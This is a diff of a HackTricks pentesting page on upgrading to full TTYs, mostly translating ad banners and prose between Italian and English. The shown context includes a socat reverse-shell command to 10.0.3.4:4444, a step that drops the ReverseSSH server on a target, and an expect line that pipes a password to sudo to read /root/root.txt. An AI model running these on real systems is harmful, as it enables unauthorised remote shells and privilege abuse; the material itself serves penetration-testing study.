@@ -1,23 +1,23 @@
 # Full TTYs
 
 {% hint style="success" %}
-Impara e pratica il hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Impara e pratica il hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Supporta HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
-* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Approfondisci la tua esperienza in **Mobile Security** con 8kSec Academy. Padroneggia la sicurezza di iOS e Android attraverso i nostri corsi autogestiti e ottieni una certificazione:
+Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
 
 {% embed url="https://academy.8ksec.io/" %}
 
@@ -73,7 +73,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ## ReverseSSH
 
-Un modo conveniente per **accesso shell interattivo**, così come **trasferimenti di file** e **port forwarding**, è scaricare il server ssh staticamente collegato [ReverseSSH](https://github.com/Fahrj/reverse-ssh) sul bersaglio.
+Un modo conveniente per **l'accesso a shell interattiva**, così come per **trasferimenti di file** e **port forwarding**, è scaricare il server ssh staticamente collegato [ReverseSSH](https://github.com/Fahrj/reverse-ssh) sul bersaglio.
 
 Di seguito è riportato un esempio per `x86` con binari compressi upx. Per altri binari, controlla la [pagina delle release](https://github.com/Fahrj/reverse-ssh/releases/latest/).
 
@@ -126,13 +126,13 @@ sftp -P 8888 127.0.0.1
 
 ## No TTY
 
-Se per qualche motivo non puoi ottenere un TTY completo, **puoi comunque interagire con i programmi** che si aspettano input dell'utente. Nell'esempio seguente, la password viene passata a `sudo` per leggere un file:
+Se per qualche motivo non riesci a ottenere un TTY completo, **puoi comunque interagire con i programmi** che si aspettano input dell'utente. Nell'esempio seguente, la password viene passata a `sudo` per leggere un file:
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
 <figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Approfondisci la tua esperienza in **Mobile Security** con 8kSec Academy. Padroneggia la sicurezza di iOS e Android attraverso i nostri corsi autogestiti e ottieni una certificazione:
+Approfondisci la tua esperienza in **Mobile Security** con 8kSec Academy. Padroneggia la sicurezza di iOS e Android attraverso i nostri corsi autogestiti e ottieni la certificazione:
 
 {% embed url="https://academy.8ksec.io/" %}
 
